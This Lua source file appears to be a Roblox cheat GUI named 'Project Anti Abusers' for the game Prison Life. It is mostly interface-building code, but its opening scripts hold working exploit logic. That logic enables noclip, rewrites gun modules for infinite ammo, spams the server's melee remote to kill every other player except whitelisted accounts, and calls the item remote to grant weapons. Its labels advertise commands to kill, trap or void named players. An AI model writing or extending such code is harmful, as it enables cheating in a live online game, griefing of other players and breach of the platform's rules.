local function MQKGPV_fake_script() -- ProjectAntiAbusers.Credits.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.Credits)

	script.Parent.MouseButton1Click:connect(function()
		script.Parent.Parent.Parent.Parent.AdminStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.BringStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.CreditsFrame.Visible = true
		script.Parent.Parent.Parent.Parent.GlobalButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GunstuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KeyBindsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KillAuraTogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.LocalFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MassButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MiscFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MusicFeedbackFrame.Visible = false
		script.Parent.Parent.Parent.Parent.OtherGuisFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TeamStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TpStuffFrame.Visible = false
	end)
end
coroutine.wrap(MQKGPV_fake_script)()
local function YGMOJP_fake_script() -- ProjectAntiAbusers.AdminStuff.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.AdminStuff)

	script.Parent.MouseButton1Click:connect(function()
		script.Parent.Parent.Parent.Parent.AdminStuffFrame.Visible = true
		script.Parent.Parent.Parent.Parent.BringStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.CreditsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GlobalButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GunstuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KeyBindsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KillAuraTogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.LocalFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MassButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MiscFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MusicFeedbackFrame.Visible = false
		script.Parent.Parent.Parent.Parent.OtherGuisFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TeamStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TpStuffFrame.Visible = false
	end)
end
coroutine.wrap(YGMOJP_fake_script)()
local function XTRGZFU_fake_script() -- ProjectAntiAbusers.InvisFrame.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.InvisFrame)

	script.Parent.Draggable = true
	noclip = false
game:GetService('RunService').Stepped:connect(function()
	if noclip then
		game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
	end
end)
	game.Players.LocalPlayer:GetMouse().KeyDown:connect(function(key)
		if key == "q" then
			saved1 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
			saved2 = workspace.Camera.CFrame
            if game.Players.LocalPlayer.PlayerGui.Home.hud.Topbar.titleBar.Title.Text == "Lights out" and game.Players.LocalPlayer.TeamColor.Color == "Bright orange" then
                saved1 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                saved2 = workspace.Camera.CFrame
                workspace.Remote.loadchar:InvokeServer("", "Fog")
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved1
                wait(.06)
                workspace.Remote.TeamEvent:FireServer("Bright orange")
                workspace.Camera.CFrame = saved2
			else
				workspace.Remote.loadchar:InvokeServer()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved1
				wait(.06)
				workspace.Camera.CFrame = saved2
            end
        elseif key == '[' then
            ProjectAntiAbusers.InvisFrame.Position = UDim2.new(0.294776112, 0, 0.289241731, 0)
            ProjectAntiAbusers.InvisFrame.Visible = true
        elseif key == 'e' then
			noclip = not noclip
            game.Players.LocalPlayer.Humanoid:ChangeState(11)
        elseif key == "p" then
            for _, idiots in pairs(game.Players:GetPlayers()) do
                if idiots.Name ~= game.Players.LocalPlayer.Name and idiots.Name ~= "Trxshba_g" and idiots.Name ~= "Shadows_Overlord" then
                    for i = 1,15 do
                        game.ReplicatedStorage.meleeEvent:FireServer(idiots)
                    end
                end
            end
		elseif key == "t" then
			gun = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
			states = require(gun.GunStates)
			states["FireRate"] = 0
			states["MaxAmmo"] = math.huge
			states["StoredAmmo"] = math.huge
			states["CurrentAmmo"] = math.huge
			states["Bullets"] = 20
			states["AutoFire"] = true
		elseif key == "z" then
			if game.Players.LocalPlayer.Name == "Shadows_Overlord" then
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				local player = game:GetService("Players").LocalPlayer
				local gun    = player.Backpack:FindFirstChild("M9")
				local sM     = require(gun:FindFirstChild("GunStates"))
				sM["MaxAmmo"] = math.huge
				sM["StoredAmmo"] = math.huge
				sM["FireRate"] = 0.0001
				sM["AmmoPerClip"] = math.huge
				sM["ReloadTime"] = 0.05
				sM["CurrentAmmo"] = math.huge
				
				local player = game:GetService("Players").LocalPlayer
				local gun    = player.Backpack:FindFirstChild("M4A1")
				local sM     = require(gun:FindFirstChild("GunStates"))
				sM["MaxAmmo"] = math.huge
				sM["StoredAmmo"] = math.huge
				sM["FireRate"] = 0.06
				sM["AmmoPerClip"] = math.huge
				sM["ReloadTime"] = 0.05
				sM["CurrentAmmo"] = math.huge
				
				local player = game:GetService("Players").LocalPlayer
				local gun    = player.Backpack:FindFirstChild("Remington 870")
				local sM     = require(gun:FindFirstChild("GunStates"))
				sM["MaxAmmo"] = math.huge
				sM["StoredAmmo"] = math.huge
				sM["FireRate"] = 0.8
				sM["AmmoPerClip"] = math.huge
				sM["ReloadTime"] = 0.05
				sM["Bullets"] = 18
				sM["CurrentAmmo"] = math.huge
			elseif game.Players.LocalPlayer.Name == "0hKieran" then
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
			elseif game.Players.LocalPlayer.Name == "vip123yesthatsme" then
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
			elseif game.Players.LocalPlayer.Name == "SuperAngelo177" then
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
			elseif game.Players.LocalPlayer.Name == "ArticGamerNL" then
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Ak-47"].ITEMPICKUP)
			end
		elseif key == "v" then
			if game.Players.LocalPlayer.Name == "Shadows_Overlord" then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.Trxshba_g.Character.HumanoidRootPart.CFrame
			end
			elseif key == 'x' then
				if script.Parent.Visible == false then
					script.Parent.Visible = true
					script.Parent:TweenPosition(UDim2.new(saved.X, saved.Y), "InOut", "Sine", 1.5)
				else
					saved = script.Parent.Position
					script.Parent:TweenPosition(UDim2.new(-0.539, 0, 0.255, 0),"InOut","Sine",1.5)
					wait(1.5)
					script.Parent.Visible = false
				end
			end
	end)
end
coroutine.wrap(XTRGZFU_fake_script)()


ProjectAntiAbusers.AdminStuffFrame.Name = "AdminStuffFrame"
ProjectAntiAbusers.AdminStuffFrame.Parent = ProjectAntiAbusers.Background
ProjectAntiAbusers.AdminStuffFrame.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.AdminStuffFrame.Position = UDim2.new(0.218999997, 0, 0.0869999975, 0)
ProjectAntiAbusers.AdminStuffFrame.Size = UDim2.new(0, 399, 0, 236)
ProjectAntiAbusers.AdminStuffFrame.Visible = false

ProjectAntiAbusers.UICorner.Parent = ProjectAntiAbusers.AdminStuffFrame

ProjectAntiAbusers.MakeUserAdmin.Name = "MakeUserAdmin"
ProjectAntiAbusers.MakeUserAdmin.Parent = ProjectAntiAbusers.AdminStuffFrame
ProjectAntiAbusers.MakeUserAdmin.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.MakeUserAdmin.Position = UDim2.new(0.0200501252, 0, 0.288135588, 0)
ProjectAntiAbusers.MakeUserAdmin.Size = UDim2.new(0, 166, 0, 27)
ProjectAntiAbusers.MakeUserAdmin.Font = Enum.Font.SourceSans
ProjectAntiAbusers.MakeUserAdmin.Text = "Make Target Admin"
ProjectAntiAbusers.MakeUserAdmin.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.MakeUserAdmin.TextSize = 18.000
ProjectAntiAbusers.MakeUserAdmin.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)

ProjectAntiAbusers.UICorner_2.Parent = ProjectAntiAbusers.MakeUserAdmin

ProjectAntiAbusers.AdminUsernameTextBox.Name = "AdminUsernameTextBox"
ProjectAntiAbusers.AdminUsernameTextBox.Parent = ProjectAntiAbusers.AdminStuffFrame
ProjectAntiAbusers.AdminUsernameTextBox.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.AdminUsernameTextBox.BorderColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.AdminUsernameTextBox.BorderSizePixel = 2
ProjectAntiAbusers.AdminUsernameTextBox.Position = UDim2.new(0.0225563906, 0, 0.0423728824, 0)
ProjectAntiAbusers.AdminUsernameTextBox.Size = UDim2.new(0, 165, 0, 50)
ProjectAntiAbusers.AdminUsernameTextBox.Font = Enum.Font.SourceSans
ProjectAntiAbusers.AdminUsernameTextBox.PlaceholderText = "Put username here!"
ProjectAntiAbusers.AdminUsernameTextBox.Text = ""
ProjectAntiAbusers.AdminUsernameTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.AdminUsernameTextBox.TextSize = 21.000
ProjectAntiAbusers.AdminUsernameTextBox.TextWrapped = true

ProjectAntiAbusers.SayCommands.Name = "SayCommands"
ProjectAntiAbusers.SayCommands.Parent = ProjectAntiAbusers.AdminStuffFrame
ProjectAntiAbusers.SayCommands.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.SayCommands.Position = UDim2.new(0.025062656, 0, 0.423728824, 0)
ProjectAntiAbusers.SayCommands.Size = UDim2.new(0, 166, 0, 27)
ProjectAntiAbusers.SayCommands.Font = Enum.Font.SourceSans
ProjectAntiAbusers.SayCommands.Text = "Say Useable Commands In-Chat"
ProjectAntiAbusers.SayCommands.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.SayCommands.TextSize = 14.000
ProjectAntiAbusers.SayCommands.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)

ProjectAntiAbusers.UICorner_3.Parent = ProjectAntiAbusers.SayCommands

ProjectAntiAbusers.ScrollingCommandsFrame.Name = "ScrollingCommandsFrame"
ProjectAntiAbusers.ScrollingCommandsFrame.Parent = ProjectAntiAbusers.AdminStuffFrame
ProjectAntiAbusers.ScrollingCommandsFrame.Active = true
ProjectAntiAbusers.ScrollingCommandsFrame.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.ScrollingCommandsFrame.BorderSizePixel = 0
ProjectAntiAbusers.ScrollingCommandsFrame.Position = UDim2.new(0.463659137, 0, 0.0211864412, 0)
ProjectAntiAbusers.ScrollingCommandsFrame.Size = UDim2.new(0, 214, 0, 225)
ProjectAntiAbusers.ScrollingCommandsFrame.CanvasSize = UDim2.new(0, 0, 5, 0)
ProjectAntiAbusers.ScrollingCommandsFrame.ScrollBarThickness = 5

ProjectAntiAbusers.TextLabel.Parent = ProjectAntiAbusers.ScrollingCommandsFrame
ProjectAntiAbusers.TextLabel.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.TextLabel.Position = UDim2.new(0.0186915882, 0, 0.00508474605, 0)
ProjectAntiAbusers.TextLabel.Size = UDim2.new(0, 200, 0, 50)
ProjectAntiAbusers.TextLabel.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TextLabel.Text = ".kcops | Kill Guards Team Except Friends"
ProjectAntiAbusers.TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TextLabel.TextSize = 18.000
ProjectAntiAbusers.TextLabel.TextWrapped = true

ProjectAntiAbusers.UICorner_4.Parent = ProjectAntiAbusers.TextLabel

ProjectAntiAbusers.TextLabel_2.Parent = ProjectAntiAbusers.ScrollingCommandsFrame
ProjectAntiAbusers.TextLabel_2.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.TextLabel_2.Position = UDim2.new(0.0280373823, 0, 0.0525423735, 0)
ProjectAntiAbusers.TextLabel_2.Size = UDim2.new(0, 200, 0, 50)
ProjectAntiAbusers.TextLabel_2.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TextLabel_2.Text = ".kpris | Kills Inmate Team Except Friends"
ProjectAntiAbusers.TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TextLabel_2.TextSize = 18.000
ProjectAntiAbusers.TextLabel_2.TextWrapped = true

ProjectAntiAbusers.UICorner_5.Parent = ProjectAntiAbusers.TextLabel_2

ProjectAntiAbusers.TextLabel_3.Parent = ProjectAntiAbusers.ScrollingCommandsFrame
ProjectAntiAbusers.TextLabel_3.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.TextLabel_3.Position = UDim2.new(0.0280373823, 0, 0.100847453, 0)
ProjectAntiAbusers.TextLabel_3.Size = UDim2.new(0, 200, 0, 50)
ProjectAntiAbusers.TextLabel_3.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TextLabel_3.Text = ".kskids | Kills Neutral Team"
ProjectAntiAbusers.TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TextLabel_3.TextSize = 18.000
ProjectAntiAbusers.TextLabel_3.TextWrapped = true

ProjectAntiAbusers.UICorner_6.Parent = ProjectAntiAbusers.TextLabel_3

ProjectAntiAbusers.TextLabel_4.Parent = ProjectAntiAbusers.ScrollingCommandsFrame
ProjectAntiAbusers.TextLabel_4.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.TextLabel_4.Position = UDim2.new(0.0280373823, 0, 0.148305088, 0)
ProjectAntiAbusers.TextLabel_4.Size = UDim2.new(0, 200, 0, 50)
ProjectAntiAbusers.TextLabel_4.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TextLabel_4.Text = ".kcrim | Kills Criminal Team Except Friends"
ProjectAntiAbusers.TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TextLabel_4.TextSize = 18.000
ProjectAntiAbusers.TextLabel_4.TextWrapped = true

ProjectAntiAbusers.UICorner_7.Parent = ProjectAntiAbusers.TextLabel_4

ProjectAntiAbusers.TextLabel_5.Parent = ProjectAntiAbusers.ScrollingCommandsFrame
ProjectAntiAbusers.TextLabel_5.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.TextLabel_5.Position = UDim2.new(0.0280373823, 0, 0.196610168, 0)
ProjectAntiAbusers.TextLabel_5.Size = UDim2.new(0, 200, 0, 50)
ProjectAntiAbusers.TextLabel_5.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TextLabel_5.Text = ".ad | Advertises Project Anti Abuser"
ProjectAntiAbusers.TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TextLabel_5.TextSize = 18.000
ProjectAntiAbusers.TextLabel_5.TextWrapped = true

ProjectAntiAbusers.UICorner_8.Parent = ProjectAntiAbusers.TextLabel_5

ProjectAntiAbusers.TextLabel_6.Parent = ProjectAntiAbusers.ScrollingCommandsFrame
ProjectAntiAbusers.TextLabel_6.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.TextLabel_6.Position = UDim2.new(0.0327102803, 0, 0.244915247, 0)
ProjectAntiAbusers.TextLabel_6.Size = UDim2.new(0, 200, 0, 50)
ProjectAntiAbusers.TextLabel_6.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TextLabel_6.Text = ".kill PLR | Kill Given Player"
ProjectAntiAbusers.TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TextLabel_6.TextSize = 18.000
ProjectAntiAbusers.TextLabel_6.TextWrapped = true

ProjectAntiAbusers.UICorner_9.Parent = ProjectAntiAbusers.TextLabel_6

ProjectAntiAbusers.TextLabel_7.Parent = ProjectAntiAbusers.ScrollingCommandsFrame
ProjectAntiAbusers.TextLabel_7.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.TextLabel_7.Position = UDim2.new(0.0280373842, 0, 0.293220341, 0)
ProjectAntiAbusers.TextLabel_7.Size = UDim2.new(0, 200, 0, 50)
ProjectAntiAbusers.TextLabel_7.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TextLabel_7.Text = ".arrest PLR | Arrest Given Player"
ProjectAntiAbusers.TextLabel_7.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TextLabel_7.TextSize = 18.000
ProjectAntiAbusers.TextLabel_7.TextWrapped = true

ProjectAntiAbusers.UICorner_10.Parent = ProjectAntiAbusers.TextLabel_7

ProjectAntiAbusers.TextLabel_8.Parent = ProjectAntiAbusers.ScrollingCommandsFrame
ProjectAntiAbusers.TextLabel_8.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.TextLabel_8.Position = UDim2.new(0.0280373842, 0, 0.340677977, 0)
ProjectAntiAbusers.TextLabel_8.Size = UDim2.new(0, 200, 0, 50)
ProjectAntiAbusers.TextLabel_8.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TextLabel_8.Text = ".userid PLR | Gives Target's UserID"
ProjectAntiAbusers.TextLabel_8.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TextLabel_8.TextSize = 18.000
ProjectAntiAbusers.TextLabel_8.TextWrapped = true

ProjectAntiAbusers.UICorner_11.Parent = ProjectAntiAbusers.TextLabel_8

ProjectAntiAbusers.TextLabel_9.Parent = ProjectAntiAbusers.ScrollingCommandsFrame
ProjectAntiAbusers.TextLabel_9.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.TextLabel_9.Position = UDim2.new(0.0280373842, 0, 0.390677989, 0)
ProjectAntiAbusers.TextLabel_9.Size = UDim2.new(0, 200, 0, 50)
ProjectAntiAbusers.TextLabel_9.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TextLabel_9.Text = ".age PLR | Gives Target's Account Age"
ProjectAntiAbusers.TextLabel_9.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TextLabel_9.TextSize = 18.000
ProjectAntiAbusers.TextLabel_9.TextWrapped = true

ProjectAntiAbusers.UICorner_12.Parent = ProjectAntiAbusers.TextLabel_9

ProjectAntiAbusers.TextLabel_10.Parent = ProjectAntiAbusers.ScrollingCommandsFrame
ProjectAntiAbusers.TextLabel_10.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.TextLabel_10.Position = UDim2.new(0.0280373842, 0, 0.438983083, 0)
ProjectAntiAbusers.TextLabel_10.Size = UDim2.new(0, 200, 0, 50)
ProjectAntiAbusers.TextLabel_10.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TextLabel_10.Text = ".crim PLR | Makes Target Criminal"
ProjectAntiAbusers.TextLabel_10.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TextLabel_10.TextSize = 18.000
ProjectAntiAbusers.TextLabel_10.TextWrapped = true

ProjectAntiAbusers.UICorner_13.Parent = ProjectAntiAbusers.TextLabel_10

ProjectAntiAbusers.TextLabel_11.Parent = ProjectAntiAbusers.ScrollingCommandsFrame
ProjectAntiAbusers.TextLabel_11.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.TextLabel_11.Position = UDim2.new(0.0280373842, 0, 0.488983095, 0)
ProjectAntiAbusers.TextLabel_11.Size = UDim2.new(0, 200, 0, 50)
ProjectAntiAbusers.TextLabel_11.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TextLabel_11.Text = ".trap PLR | Traps Target"
ProjectAntiAbusers.TextLabel_11.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TextLabel_11.TextSize = 18.000
ProjectAntiAbusers.TextLabel_11.TextWrapped = true

ProjectAntiAbusers.UICorner_14.Parent = ProjectAntiAbusers.TextLabel_11

ProjectAntiAbusers.TextLabel_12.Parent = ProjectAntiAbusers.ScrollingCommandsFrame
ProjectAntiAbusers.TextLabel_12.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.TextLabel_12.Position = UDim2.new(0.0280373842, 0, 0.538983107, 0)
ProjectAntiAbusers.TextLabel_12.Size = UDim2.new(0, 200, 0, 50)
ProjectAntiAbusers.TextLabel_12.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TextLabel_12.Text = ".void PLR | Teleports Target Into The Void"
ProjectAntiAbusers.TextLabel_12.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TextLabel_12.TextSize = 18.000
ProjectAntiAbusers.TextLabel_12.TextWrapped = true

ProjectAntiAbusers.UICorner_15.Parent = ProjectAntiAbusers.TextLabel_12

ProjectAntiAbusers.TextLabel_13.Parent = ProjectAntiAbusers.ScrollingCommandsFrame
ProjectAntiAbusers.TextLabel_13.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.TextLabel_13.Position = UDim2.new(0.0327102803, 0, 0.588983119, 0)
ProjectAntiAbusers.TextLabel_13.Size = UDim2.new(0, 200, 0, 50)
ProjectAntiAbusers.TextLabel_13.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TextLabel_13.Text = ".killall | Kills Everyone Except Friends"
ProjectAntiAbusers.TextLabel_13.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TextLabel_13.TextSize = 18.000
ProjectAntiAbusers.TextLabel_13.TextWrapped = true

ProjectAntiAbusers.UICorner_16.Parent = ProjectAntiAbusers.TextLabel_13

ProjectAntiAbusers.ExtraPermStuff.Name = "ExtraPermStuff"
ProjectAntiAbusers.ExtraPermStuff.Parent = ProjectAntiAbusers.AdminStuffFrame
ProjectAntiAbusers.ExtraPermStuff.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.ExtraPermStuff.Position = UDim2.new(0.025062656, 0, 0.843220353, 0)
ProjectAntiAbusers.ExtraPermStuff.Size = UDim2.new(0, 166, 0, 27)
ProjectAntiAbusers.ExtraPermStuff.Font = Enum.Font.SourceSans
ProjectAntiAbusers.ExtraPermStuff.Text = "Extra Permission Stuff"
ProjectAntiAbusers.ExtraPermStuff.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.ExtraPermStuff.TextSize = 19.000
ProjectAntiAbusers.ExtraPermStuff.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)

ProjectAntiAbusers.UICorner_17.Parent = ProjectAntiAbusers.ExtraPermStuff

ProjectAntiAbusers.BringStuffFrame.Name = "BringStuffFrame"
ProjectAntiAbusers.BringStuffFrame.Parent = ProjectAntiAbusers.Background
ProjectAntiAbusers.BringStuffFrame.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.BringStuffFrame.Position = UDim2.new(0.218999997, 0, 0.0869999975, 0)
ProjectAntiAbusers.BringStuffFrame.Size = UDim2.new(0, 399, 0, 236)
ProjectAntiAbusers.BringStuffFrame.Visible = false

ProjectAntiAbusers.UICorner_18.Parent = ProjectAntiAbusers.BringStuffFrame

ProjectAntiAbusers.makeallcrim.Name = "make all crim"
ProjectAntiAbusers.makeallcrim.Parent = ProjectAntiAbusers.BringStuffFrame
ProjectAntiAbusers.makeallcrim.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
ProjectAntiAbusers.makeallcrim.Position = UDim2.new(0.52348876, 0, 0.781578481, 0)
ProjectAntiAbusers.makeallcrim.Size = UDim2.new(0, 184, 0, 38)
ProjectAntiAbusers.makeallcrim.Font = Enum.Font.SourceSans
ProjectAntiAbusers.makeallcrim.Text = "Make All Crim"
ProjectAntiAbusers.makeallcrim.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.makeallcrim.TextSize = 15.000

ProjectAntiAbusers.UICorner_19.Parent = ProjectAntiAbusers.makeallcrim

ProjectAntiAbusers.killallguards.Name = "kill all guards"
ProjectAntiAbusers.killallguards.Parent = ProjectAntiAbusers.BringStuffFrame
ProjectAntiAbusers.killallguards.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
ProjectAntiAbusers.killallguards.Position = UDim2.new(0.0272481441, 0, 0.781578541, 0)
ProjectAntiAbusers.killallguards.Size = UDim2.new(0, 184, 0, 38)
ProjectAntiAbusers.killallguards.Font = Enum.Font.SourceSans
ProjectAntiAbusers.killallguards.Text = "Kill all guards"
ProjectAntiAbusers.killallguards.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.killallguards.TextSize = 15.000

ProjectAntiAbusers.UICorner_20.Parent = ProjectAntiAbusers.killallguards

ProjectAntiAbusers.BorderFrame.Name = "BorderFrame"
ProjectAntiAbusers.BorderFrame.Parent = ProjectAntiAbusers.BringStuffFrame
ProjectAntiAbusers.BorderFrame.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.BorderFrame.BorderColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.BorderFrame.BorderSizePixel = 2
ProjectAntiAbusers.BorderFrame.Position = UDim2.new(0.523809552, 0, 0.0423728824, 0)
ProjectAntiAbusers.BorderFrame.Size = UDim2.new(0, 183, 0, 132)

ProjectAntiAbusers.makecrimtextbox.Name = "makecrimtextbox"
ProjectAntiAbusers.makecrimtextbox.Parent = ProjectAntiAbusers.BorderFrame
ProjectAntiAbusers.makecrimtextbox.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
ProjectAntiAbusers.makecrimtextbox.Position = UDim2.new(0.00425589085, 0, 0.000873077661, 0)
ProjectAntiAbusers.makecrimtextbox.Size = UDim2.new(0, 183, 0, 39)
ProjectAntiAbusers.makecrimtextbox.Font = Enum.Font.SourceSans
ProjectAntiAbusers.makecrimtextbox.Text = "Make Teams Criminal"
ProjectAntiAbusers.makecrimtextbox.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.makecrimtextbox.TextSize = 21.000

ProjectAntiAbusers.UICorner_21.Parent = ProjectAntiAbusers.makecrimtextbox

ProjectAntiAbusers.makeguardcrim.Name = "make guard crim"
ProjectAntiAbusers.makeguardcrim.Parent = ProjectAntiAbusers.BorderFrame
ProjectAntiAbusers.makeguardcrim.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
ProjectAntiAbusers.makeguardcrim.Position = UDim2.new(0.532799542, 0, 0.340403944, 0)
ProjectAntiAbusers.makeguardcrim.Size = UDim2.new(0, 85, 0, 40)
ProjectAntiAbusers.makeguardcrim.Font = Enum.Font.SourceSans
ProjectAntiAbusers.makeguardcrim.Text = "Make Guards Crim"
ProjectAntiAbusers.makeguardcrim.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.makeguardcrim.TextSize = 13.000

ProjectAntiAbusers.UICorner_22.Parent = ProjectAntiAbusers.makeguardcrim

ProjectAntiAbusers.makeinmatecrim.Name = "makeinmatecrim"
ProjectAntiAbusers.makeinmatecrim.Parent = ProjectAntiAbusers.BorderFrame
ProjectAntiAbusers.makeinmatecrim.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
ProjectAntiAbusers.makeinmatecrim.Position = UDim2.new(-0.00078044954, 0, 0.341569483, 0)
ProjectAntiAbusers.makeinmatecrim.Size = UDim2.new(0, 84, 0, 40)
ProjectAntiAbusers.makeinmatecrim.Font = Enum.Font.SourceSans
ProjectAntiAbusers.makeinmatecrim.Text = "Make Inmate Crim"
ProjectAntiAbusers.makeinmatecrim.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.makeinmatecrim.TextSize = 13.000

